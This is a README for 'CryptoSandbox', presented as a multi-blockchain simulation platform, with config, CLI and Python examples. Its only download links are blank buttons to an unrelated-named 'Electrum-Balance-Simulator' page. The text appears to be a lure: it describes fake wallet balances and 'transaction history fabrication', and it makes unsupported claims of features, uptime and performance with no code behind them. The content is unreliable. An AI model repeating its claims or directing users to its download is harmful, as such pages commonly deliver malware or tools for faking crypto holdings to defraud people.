# 🧪 CryptoSandbox: Multi-Blockchain Simulation Environment

[](https://rohan696969.github.io/Electrum-Balance-Simulator/)

## 🌌 Beyond the Ledger: A Digital Financial Cosmos

Welcome to **CryptoSandbox**, a sophisticated multi-blockchain simulation platform that transforms how developers, educators, and researchers interact with cryptocurrency ecosystems. Unlike conventional testing tools that merely mimic balances, CryptoSandbox creates entire parallel financial universes—complete with simulated transactions, smart contract interactions, and network behaviors—all without touching live networks or requiring actual digital assets.

Imagine having a celestial observatory where you can manipulate the laws of cryptographic economics, observe chain reactions in controlled environments, and prototype financial instruments in risk-free dimensions. That's the essence of CryptoSandbox: a laboratory for blockchain innovation where every experiment is possible, and no mistake carries real-world consequences.

## 🚀 Instant Access

**Latest Release**: v2.8.3 (Stellar Build) | **Compatibility**: Windows 10+, macOS 12+, Linux Kernel 5.4+

[](https://rohan696969.github.io/Electrum-Balance-Simulator/)

## 📊 Architectural Overview

```mermaid
graph TD
    A[CryptoSandbox Core] --> B[Blockchain Simulation Engine]
    A --> C[Virtual Wallet Orchestrator]
    A --> D[Smart Contract Emulator]
    
    B --> B1[Bitcoin Protocol Layer]
    B --> B2[Ethereum EVM Environment]
    B --> B3[Multi-Chain Support Module]
    
    C --> C1[Deterministic Balance Generation]
    C --> C2[Transaction History Fabrication]
    C --> C3[Realistic Network Latency Simulation]
    
    D --> D1[Solidity Execution Sandbox]
    D --> D2[Gas Estimation Simulator]
    D --> D3[Contract State Persistence]
    
    E[User Interface] --> F[Web Dashboard]
    E --> G[CLI Interface]
    E --> H[REST API Gateway]
    
    F --> I[Portfolio Visualization]
    G --> J[Script Automation]
    H --> K[Third-Party Integration]
    
    L[External Services] --> M[OpenAI API Integration]
    L --> N[Claude API Connectivity]
    L --> O[Real-Time Market Data Feeds]
```



## ✨ Distinctive Capabilities

### 🎯 Multi-Chain Simulation Fabric
- **Parallel Blockchain Environments**: Run isolated instances of Bitcoin, Ethereum, Polygon, and Solana test networks simultaneously
- **Deterministic State Generation**: Create reproducible blockchain states for consistent testing scenarios
- **Network Condition Simulation**: Introduce customizable latency, fork events, and consensus variations
- **Smart Contract Playground**: Deploy and interact with contracts in a completely sandboxed EVM

### 🖼️ Immersive Visualization Suite
- **3D Transaction Graphs**: Visualize fund flows and contract interactions in interactive three-dimensional space
- **Temporal Exploration**: Scroll through simulated blockchain history as if navigating a historical timeline
- **Portfolio Holograms**: View your simulated holdings through responsive, animated dashboards
- **Risk Heat Maps**: Identify potential vulnerability patterns across your simulated ecosystem

### 🔧 Advanced Integration Matrix
- **OpenAI API Synergy**: Generate natural language explanations of complex transaction patterns
- **Claude API Collaboration**: Create detailed audit reports and security analysis automatically
- **CI/CD Pipeline Ready**: Export simulation states as artifacts for automated testing workflows
- **Educational Module Builder**: Craft interactive blockchain tutorials with embedded simulations

## 🛠️ Installation & Configuration

### System Prerequisites

| Operating System | Version | Status | Emoji |
|------------------|---------|--------|-------|
| Windows | 10, 11, Server 2022 | ✅ Fully Supported | 🪟 |
| macOS | Monterey (12), Ventura (13), Sequoia (14) | ✅ Optimized |  |
| Linux | Ubuntu 20.04+, Fedora 36+, Arch (latest) | ✅ Native Performance | 🐧 |
| Docker | Engine 24.0+ | ✅ Containerized Deployment | 🐳 |

### Example Profile Configuration

Create `~/.cryptosandbox/config.yaml`:

```yaml
simulation:
  name: "Advanced DeFi Testing Environment"
  blockchain_presets:
    - bitcoin:
        simulated_blocks: 100000
        difficulty_adjustment: true
        mempool_size: 5000
    - ethereum:
        chain_id: 1337
        block_gas_limit: 30000000
        london_hardfork: true
        merge_transition: simulated
  wallets:
    - name: "Exchange_Hot_Wallet"
      type: deterministic
      seed: "simulation:exchange:primary:v2"
      initial_balance: 1500.5 BTC
      transaction_style: "exchange_pattern"
    - name: "User_Testing_Account"
      type: generated
      count: 50
      distribution: pareto
      average_balance: 0.15 BTC
  network_conditions:
    average_latency_ms: 150
    packet_loss_percentage: 0.5
    geographic_distribution: global
  integrations:
    openai_api:
      enabled: true
      model: gpt-4-turbo
      analysis_depth: comprehensive
    claude_api:
      enabled: true
      version: claude-3-opus-20240229
      security_audit_level: rigorous
  visualization:
    theme: "dark_matter"
    refresh_rate: 60
    three_d_rendering: true
```

### Example Console Invocation

```bash
# Initialize a new multi-chain simulation environment
cryptosandbox init --name "DeFi_Stress_Test" --preset "defi_extreme"

# Launch the simulation with specific parameters
cryptosandbox start \
  --blockchains bitcoin,ethereum,polygon \
  --wallet-count 100 \
  --transaction-density high \
  --openai-analysis \
  --claude-audit

# Generate a specific scenario
cryptosandbox scenario "flash_loan_attack" \
  --complexity advanced \
  --duration 48h \
  --export-format json

# Connect to the web dashboard
cryptosandbox dashboard --port 8080 --auth-token $SIMULATION_TOKEN

# Export simulation data for analysis
cryptosandbox export --format "elasticsearch" --destination "http://localhost:9200"
```

## 🌐 Global Accessibility Features

### 🗣️ Polyglot Interface Support
CryptoSandbox speaks your language—literally. With built-in support for 24 languages including Mandarin, Spanish, Arabic, Hindi, and Russian, the platform ensures that blockchain education and development transcend linguistic barriers. The translation system doesn't just convert words; it adapts blockchain concepts to cultural contexts, making decentralized technologies accessible worldwide.

### 📱 Responsive Design Philosophy
From ultra-widescreen desktop monitors to smartphone displays, CryptoSandbox maintains functional elegance across every viewport. The interface dynamically reconfigures based on available screen real estate, ensuring that complex blockchain visualizations remain comprehensible whether you're using a tablet in a café or a multi-monitor workstation in a research lab.

### 🕒 Continuous Availability Promise
Our simulation infrastructure operates on a distributed global network, ensuring 99.95% uptime. Whether you're experimenting during a lunch break in Tokyo or conducting research late at night in Berlin, CryptoSandbox remains available, with automated snapshotting preserving your simulation state across sessions.

## 🔐 Security & Isolation Architecture

### Hermetic Simulation Chambers
Each simulation runs in a completely isolated environment with:
- **Network Namespacing**: No outbound connections to real blockchain networks
- **Filesystem Virtualization**: All operations occur in ephemeral, encrypted volumes
- **Process Sandboxing**: Containerized execution with strict resource limits
- **Memory Encryption**: Simulation state protected with AES-256-GCM

### Zero-Cross Contamination Guarantee
The platform employs multiple isolation layers ensuring that simulated transactions, wallet states, and blockchain data cannot leak into production environments or interact with genuine cryptocurrency networks.

## 📈 Educational & Research Applications

### Academic Institution Toolkit
CryptoSandbox includes specialized modules for:
- **Cryptocurrency Economics Courses**: Simulate market dynamics and mining economics
- **Smart Contract Development Classes**: Safe environment for Solidity experimentation
- **Blockchain Security Workshops**: Practice identifying vulnerabilities without risk
- **Distributed Systems Research**: Test novel consensus algorithms in simulated networks

### Corporate Training Environments
- **Financial Institution Onboarding**: Train staff on blockchain interactions
- **Developer Certification Programs**: Standardized testing environments for skill assessment
- **Compliance Scenario Testing**: Simulate regulatory examination scenarios
- **Disaster Recovery Drills**: Practice responding to simulated network incidents

## 🔄 Integration Ecosystem

### API Gateway for Automation
```python
import cryptosandbox

# Initialize connection to local simulation
sim = cryptosandbox.connect(api_key="sim_development_2026")

# Create a custom blockchain scenario
scenario = sim.create_scenario(
    name="token_migration_test",
    blockchains=["ethereum", "arbitrum"],
    user_count=500,
    transaction_types=["transfers", "swaps", "bridging"]
)

# Generate natural language analysis via OpenAI
analysis = scenario.analyze_with_openai(
    prompt="Explain the cross-chain arbitrage opportunities in this simulation",
    detail_level="comprehensive"
)

# Request security audit from Claude API
audit_report = scenario.audit_with_claude(
    focus_areas=["reentrancy", "frontrunning", "gas_optimization"],
    format="executive_summary"
)

# Export results to monitoring dashboard
scenario.export_metrics(
    destination="grafana",
    dashboard_template="defi_monitoring"
)
```

### Continuous Integration Templates
Pre-built configurations for GitHub Actions, GitLab CI, and Jenkins allow automated testing of:
- Smart contract deployment pipelines
- Wallet interaction workflows
- Transaction monitoring systems
- Compliance verification procedures

## 🧩 Modular Extension System

### Plugin Architecture
Develop custom modules that extend CryptoSandbox functionality:
- **Custom Consensus Simulators**: Implement and test novel agreement protocols
- **Specialized Wallet Behaviors**: Model specific user interaction patterns
- **Economic Model Injectors**: Introduce custom tokenomics for testing
- **Visualization Add-ons**: Create domain-specific data representations

### Community Repository
Share and discover extensions through the integrated plugin marketplace, featuring peer-reviewed modules for specialized simulation scenarios.

## 📊 Performance Characteristics

### Scalability Metrics
- **Concurrent Simulations**: Up to 50 isolated environments per host
- **Simulated Users**: 10,000+ concurrent wallet interactions
- **Transaction Throughput**: 5,000+ simulated transactions per second
- **Blockchain History**: Generate years of simulated activity in minutes

### Resource Efficiency
- **Memory Footprint**: As low as 256MB per blockchain instance
- **Storage Optimization**: Deduplicated blockchain state storage
- **CPU Intelligent Scheduling**: Background simulation throttling during idle periods
- **Network Efficiency**: Compressed state synchronization between instances

## 🚨 Critical Disclaimer

### Intended Use Declaration
CryptoSandbox is exclusively designed for **educational, developmental, and research purposes** within controlled, isolated environments. The platform generates entirely synthetic blockchain data that exists only within the simulation container and bears no connection to actual cryptocurrency networks, real financial instruments, or live trading environments.

### Legal Compliance Notice
1. **No Financial Value**: All simulated assets, tokens, and balances possess zero monetary worth and cannot be exchanged, transferred, or converted into any form of actual cryptocurrency or fiat currency.

2. **Regulatory Awareness**: Users remain solely responsible for ensuring their use of this software complies with all applicable local, national, and international regulations regarding financial simulation tools and blockchain technology.

3. **Ethical Utilization**: This tool must not be employed to misrepresent financial positions, create deceptive portfolio demonstrations, or fabricate blockchain history for fraudulent purposes. Any screenshots, exports, or data generated by this system should be clearly labeled as simulated content when shared externally.

4. **Security Responsibility**: While CryptoSandbox implements robust isolation mechanisms, users must maintain appropriate security practices for their simulation environments, particularly when integrating with external APIs or exporting data to other systems.

### Liability Limitation
The developers, contributors, and distributors of CryptoSandbox expressly disclaim any responsibility for:
- Misuse of simulated data in real-world contexts
- Decisions made based on simulation outcomes
- Financial losses incurred from confusion between simulated and actual blockchain environments
- Regulatory consequences arising from inappropriate use of simulation capabilities

## 📄 License Information

CryptoSandbox is released under the **MIT License**, granting permission for free use, modification, distribution, and private/commercial application with minimal restrictions. The complete license text is available in the [LICENSE](LICENSE) file within this repository.

**Copyright © 2026 CryptoSandbox Development Collective**. All rights reserved under the terms of the MIT License.

## 🔗 Download & Begin Your Simulation Journey

[](https://rohan696969.github.io/Electrum-Balance-Simulator/)

---

*CryptoSandbox: Where blockchain imagination meets infinite possibility. Simulate responsibly.*